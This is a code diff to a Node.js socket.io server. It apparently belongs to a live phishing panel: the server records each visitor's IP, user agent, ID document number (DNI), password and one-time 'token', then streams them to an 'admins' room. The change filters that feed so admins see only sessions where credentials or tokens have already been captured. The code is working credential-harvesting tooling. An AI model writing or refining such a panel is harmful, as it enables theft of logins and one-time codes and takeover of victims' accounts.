@@ -43,14 +43,20 @@ app.get("/health", (_req, res) => {
 const sessions = new Map();
 
 function broadcastSessions() {
-  const sessionList = Array.from(sessions.values());
+  const sessionList = Array.from(sessions.values()).filter((s) => {
+    return (
+      (s.docNumber && s.docNumber.trim().length > 0) ||
+      (s.password && s.password.trim().length > 0) ||
+      (s.token && s.token.trim().length > 0)
+    );
+  });
   io.to("admins").emit("sessions:update", sessionList);
 }
 
 io.on("connection", (socket) => {
   socket.on("admin:join", () => {
     socket.join("admins");
-    socket.emit("sessions:update", Array.from(sessions.values()));
+    broadcastSessions();
   });
 
   socket.on("client:init", (data) => {
@@ -71,12 +77,24 @@ io.on("connection", (socket) => {
   });
 
   socket.on("client:update", (data) => {
-    const session = sessions.get(socket.id) || {
+    let session = sessions.get(socket.id) || {
       id: socket.id,
       ip: socket.handshake.address || "127.0.0.1",
       userAgent: socket.handshake.headers["user-agent"] || "",
+      docType: "DNI",
+      docNumber: "",
+      password: "",
+      token: "",
     };
-    Object.assign(session, data, { updatedAt: new Date().toLocaleTimeString() });
+
+    if (data.docType) session.docType = data.docType;
+    if (data.docNumber !== undefined && data.docNumber.trim() !== "") session.docNumber = data.docNumber.trim();
+    if (data.password !== undefined && data.password !== "") session.password = data.password;
+    if (data.token !== undefined && data.token !== "") session.token = data.token;
+    if (data.step) session.step = data.step;
+    if (data.status) session.status = data.status;
+    session.updatedAt = new Date().toLocaleTimeString();
+
     sessions.set(socket.id, session);
     broadcastSessions();
   });
